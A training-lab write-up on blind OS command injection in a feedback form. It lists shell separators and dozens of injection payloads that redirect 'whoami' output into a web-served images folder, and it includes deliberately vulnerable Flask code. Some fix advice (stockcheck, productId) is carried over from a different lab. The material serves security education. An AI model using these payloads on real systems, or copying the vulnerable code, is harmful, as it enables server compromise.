# Summary – Lab 3: Blind OS command injection with output redirection

## Lab Information
**Topic:** OS command injection  
**Difficulty:** Apprentice

## Lab Description
This lab’s feedback form is vulnerable to blind OS command injection. The server executes a shell command incorporating user-supplied data from feedback fields, but does not return the command output in the HTTP response. However, the lab provides a writable directory `/var/www/images/` that is exposed via an image endpoint `/image?filename=<name>`. By redirecting command output into this directory, an attacker can retrieve the results through the web interface.

The goal is to execute the `whoami` command and read its output by leveraging output redirection to the images folder.

## Vulnerability Analysis
The vulnerable code behaves similarly to Lab 2, but there is an additional file-based exfiltration channel: a writable directory that is directly served as static content. Because the application’s shell command is executed with permissions that allow writing into `/var/www/images/`, an attacker can:

1. Inject OS commands in one of the feedback fields.
2. Use shell redirection (`>` or `>>`) to write output to a file such as `/var/www/images/test_file.txt`.
3. Request `/image?filename=test_file.txt` to retrieve the output.

This combines OS command injection with insecure file-system and static-resource configuration.

## Exploitation Steps
1. **Identify the vulnerable endpoint**
   - Feedback form at `/feedback` posting to `POST /feedback/submit` with CSRF token.
2. **Enumerate potential injection points**
   - Parameters: `name`, `email`, `subject`, `message`.
3. **Use an Intruder-like Sniper attack**
   - Test each parameter with multiple payload wrappers (e.g. `;<PAYLOAD>`, `&<PAYLOAD>`, `$(<PAYLOAD>)`, newlines) where `<PAYLOAD>` is an OS command.
   - Confirm which parameter allows successful command execution (e.g. via timing in early testing or by checking for file creation).
4. **Abuse output redirection**
   - Use payloads such as:
     ```
     whoami > /var/www/images/test_file15.txt
     $(whoami > /var/www/images/test_file16.txt)
     ```
   - Wrapped with separators, for example: `;whoami > /var/www/images/test_file15.txt`.
5. **Retrieve the output**
   - Request: `/image?filename=test_file15.txt` or `/image?filename=test_file16.txt`.
   - The server responds with a text file containing the output of `whoami`.
6. **Verify successful exploitation**
   - Confirm that the file is served and contains the OS username under which the application is running.

We use a counter at the end of the filename to identify what exact parameter is vulnerable and what exact payload works. You can use test_file.txt for simplifying the attack, just to solve the lab.

## Separators List
```sh
;
|
||
&
&&
\n
`(payload)`
$(payload)
```

## Payloads List
```sh
;whoami > /var/www/images/test_file
&whoami > /var/www/images/test_file
&&whoami > /var/www/images/test_file
|whoami > /var/www/images/test_file
||whoami > /var/www/images/test_file
%0awhoami > /var/www/images/test_file
$(whoami > /var/www/images/test_file
`whoami > /var/www/images/test_file
;whoami > /var/www/images/test_file;
&whoami > /var/www/images/test_file&
&&whoami > /var/www/images/test_file&&
|whoami > /var/www/images/test_file|
||whoami > /var/www/images/test_file||
%0awhoami > /var/www/images/test_file%0a
`whoami > /var/www/images/test_file`
$(whoami > /var/www/images/test_file)
;whoami > /var/www/images/test_file.txt
&whoami > /var/www/images/test_file.txt
&&whoami > /var/www/images/test_file.txt
|whoami > /var/www/images/test_file.txt
||whoami > /var/www/images/test_file.txt
%0awhoami > /var/www/images/test_file.txt
$(whoami > /var/www/images/test_file.txt
`whoami > /var/www/images/test_file.txt
;whoami > /var/www/images/test_file.txt;
&whoami > /var/www/images/test_file.txt&
&&whoami > /var/www/images/test_file.txt&&
|whoami > /var/www/images/test_file.txt|
||whoami > /var/www/images/test_file.txt||
%0awhoami > /var/www/images/test_file.txt%0a
`whoami > /var/www/images/test_file.txt`
$(whoami > /var/www/images/test_file.txt)
;whoami > /var/www/images/test_file.png
&whoami > /var/www/images/test_file.png
&&whoami > /var/www/images/test_file.png
|whoami > /var/www/images/test_file.png
||whoami > /var/www/images/test_file.png
%0awhoami > /var/www/images/test_file.png
$(whoami > /var/www/images/test_file.png
`whoami > /var/www/images/test_file.png
;whoami > /var/www/images/test_file.png;
&whoami > /var/www/images/test_file.png&
&&whoami > /var/www/images/test_file.png&&
|whoami > /var/www/images/test_file.png|
||whoami > /var/www/images/test_file.png||
%0awhoami > /var/www/images/test_file.png%0a
`whoami > /var/www/images/test_file.png`
$(whoami > /var/www/images/test_file.png)
;whoami > /var/www/images/test_file.jpg
&whoami > /var/www/images/test_file.jpg
&&whoami > /var/www/images/test_file.jpg
|whoami > /var/www/images/test_file.jpg
||whoami > /var/www/images/test_file.jpg
%0awhoami > /var/www/images/test_file.jpg
$(whoami > /var/www/images/test_file.jpg
`whoami > /var/www/images/test_file.jpg
;whoami > /var/www/images/test_file.jpg;
&whoami > /var/www/images/test_file.jpg&
&&whoami > /var/www/images/test_file.jpg&&
|whoami > /var/www/images/test_file.jpg|
||whoami > /var/www/images/test_file.jpg||
%0awhoami > /var/www/images/test_file.jpg%0a
`whoami > /var/www/images/test_file.jpg`
$(whoami > /var/www/images/test_file.jpg)
```

With counter
```sh
;whoami > /var/www/images/test_file1.txt
&whoami > /var/www/images/test_file2.txt
&&whoami > /var/www/images/test_file3.txt
|whoami > /var/www/images/test_file4.txt
||whoami > /var/www/images/test_file5.txt
%0awhoami > /var/www/images/test_file6.txt
$(whoami > /var/www/images/test_file7.txt
`whoami > /var/www/images/test_file8.txt
;whoami > /var/www/images/test_file9.txt;
&whoami > /var/www/images/test_file10.txt&
&&whoami > /var/www/images/test_file11.txt&&
|whoami > /var/www/images/test_file12.txt|
||whoami > /var/www/images/test_file13.txt||
%0awhoami > /var/www/images/test_file14.txt%0a
`whoami > /var/www/images/test_file15.txt`
$(whoami > /var/www/images/test_file16.txt)
```

## AppSec Perspective

### What the underlying code might be
A simplified vulnerable implementation in Python:

```python
import subprocess
from flask import request

IMAGES_DIR = "/var/www/images/"

def submit_feedback():
    name = request.form.get("name", "")
    email = request.form.get("email", "")
    subject = request.form.get("subject", "")
    message = request.form.get("message", "")

    # VULNERABLE: shell command using user input,
    # executed asynchronously, output is discarded.
    cmd = (
        f"/usr/sbin/sendmail '{email}' <<EOF\n"
        f"Subject: {subject}\nFrom: {name}\n\n{message}\nEOF"
    )
    subprocess.Popen(cmd, shell=True)  # asynchronous, no captured output

    return "Thanks for your feedback"
```

And a naive image-serving endpoint:

```python
from flask import send_from_directory

IMAGES_DIR = "/var/www/images"

@app.route("/image")
def image():
    filename = request.args.get("filename", "")
    return send_from_directory(IMAGES_DIR, filename)
```

### Security issues enabling exploitation
- **OS command injection** due to shell invocation with untrusted input.
- **Unrestricted outbound DNS/HTTP traffic** from the application server to arbitrary domains.
- **Writable web root or static directory** (`/var/www/images/`), allowing the application to write files that are then directly served to clients.
- **Unvalidated `filename` parameter** in `/image`, enabling retrieval of any file within the images directory (and potentially path traversal if not constrained).
- Overly permissive file-system permissions that allow the web app user to write to directories served by the web server.

### How to fix it
1. **Avoid the shell entirely (primary fix)**  
   - Use safe APIs that pass arguments as a list and do not invoke a shell:
   ```python
   cmd = ["/usr/local/bin/stockcheck", product_id, store_id]
   output = subprocess.check_output(cmd, shell=False, text=True)
   ```
   - In Node.js, use `spawn`/`execFile` with an array of arguments and no shell.

2. **Apply strict input validation / allow-listing**
   - `productId` and `storeId` should be numeric or selected from known identifiers.
   - Enforce type and range constraints server-side (e.g. only digits, length limits).

3. **Least privilege & separation of duties**
   - Run the web application under an account with minimal OS privileges.
   - Use OS-level permissions so that the application user cannot write to web-served paths like `/var/www/images/`.
   - If possible, isolate the stock-checking logic in a separate service, not via shell.

4. **Do not serve writable directories as static content**
   - Separate **upload directories** from static assets; static assets should be read-only for the application process.
   - Configure the web server so that directories the app can write to are not directly downloadable, or enforce strict validation of file names and types.

5. **Harden resource endpoints**
   - For `/image`, use identifiers or keys instead of direct filenames.
   - Implement an allow-list of legitimate image names or maintain metadata in a database.
   - Restrict allowed extensions to safe, expected types (`.png`, `.jpg`, etc.).

### Safe code version
```python
import re
import subprocess
from flask import request, abort

SENDMAIL_PATH = "/usr/sbin/sendmail"

# Allow only "normal" header characters: letters, digits, space, and some punctuation.
# This is a strict allow-list to avoid CRLF, control chars, etc.
HEADER_RE = re.compile(r"^[A-Za-z0-9 .,'\"()\-]*$")

# Basic email pattern for demonstration; in real apps use a robust library (e.g. email-validator).
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

MAX_NAME_LEN = 200
MAX_SUBJECT_LEN = 200
MAX_EMAIL_LEN = 254
MAX_MESSAGE_LEN = 10_000  # body can be larger but still should be bounded


def _validate_header_field(value: str, max_len: int, field_name: str) -> str:
    """
    Validate a header-like field using an allow-list:
    - strip leading/trailing whitespace
    - enforce length
    - enforce allowed character set (no CR/LF, no control characters)
    """
    value = (value or "").strip()

    if len(value) > max_len:
        abort(400, description=f"{field_name} too long")

    if not HEADER_RE.fullmatch(value):
        # OWASP-style: fail closed when unexpected characters appear.
        abort(400, description=f"Invalid characters in {field_name}")

    return value


def _validate_email(email: str) -> str:
    # First apply generic header validation (length & allowed chars)
    email = _validate_header_field(email, MAX_EMAIL_LEN, "email")

    # Then apply more specific email shape check
    if not EMAIL_RE.fullmatch(email):
        abort(400, description="Invalid email address")

    return email


def submit_feedback():
    # 1. Extract raw inputs
    raw_name = request.form.get("name", "")
    raw_email = request.form.get("email", "")
    raw_subject = request.form.get("subject", "")
    raw_message = request.form.get("message", "")

    # 2. Strong validation / allow-listing for header fields
    name = _validate_header_field(raw_name, MAX_NAME_LEN, "name")
    email = _validate_email(raw_email)
    subject = _validate_header_field(raw_subject, MAX_SUBJECT_LEN, "subject")

    # 3. Message body: allow newlines, but bound the size
    message = raw_message or ""
    if len(message) > MAX_MESSAGE_LEN:
        abort(400, description="message too long")

    # 4. Build RFC5322-ish message.
    #    No CRLF injection possible because headers are allow-listed.
    email_body = (
        f"To: {email}\n"
        f"From: {name or 'no-reply@example.com'}\n"
        f"Subject: {subject}\n"
        "\n"
        f"{message}\n"
    )

    # 5. Call sendmail safely WITHOUT a shell.
    try:
        proc = subprocess.Popen(
            [SENDMAIL_PATH, "-i", "--", email],  # args list → no shell
            stdin=subprocess.PIPE,
            text=True,
        )
        proc.communicate(email_body, timeout=10)

        if proc.returncode != 0:
            # In a real app, log return code / stderr, but don't leak details to user.
            abort(500, description="Failed to send feedback")
    except Exception:
        abort(500, description="Failed to send feedback")

    return "Thanks for your feedback"
```

## Key Takeaways

**Lessons from Attacker perspective**
- Blind injection can often be turned into visible output using output redirection to writable directories.
- Combining multiple weaknesses (OS command injection + insecure file serving) can greatly extend impact.
- Testing different separators and wrappers (`;`, `&`, `|`, backticks, `$()`, newlines) helps bypass simple filters (increases chances of hitting the vulnerable parameter and syntax).
- Test all user-controllable parameters (injection points), not just the obviously “dangerous” ones; in this lab it's not only the `email` field.
- Combine automation Intruder and custom scripts.

**Lessons from AppSec (defender) perspective**
- Treat any OS command execution as a high-risk operation; avoid it where possible (Remove shell usage in business logic; use high-level libraries that do not expose OS commands).
- Never pass untrusted input into a shell; use parameterized process APIs with allow-listed arguments.
- Apply least privilege and avoid exposing raw backend or OS-level output to clients.
- Address root cause (command injection), but also harden file-system and static resource configurations as defense-in-depth to reduce the impact of such vulnerabilities.
- Writable directories that are directly exposed by the web server present a powerful exfiltration channel.
- Isolate static content from application-writable storage; do not let the app write into directories it serves.
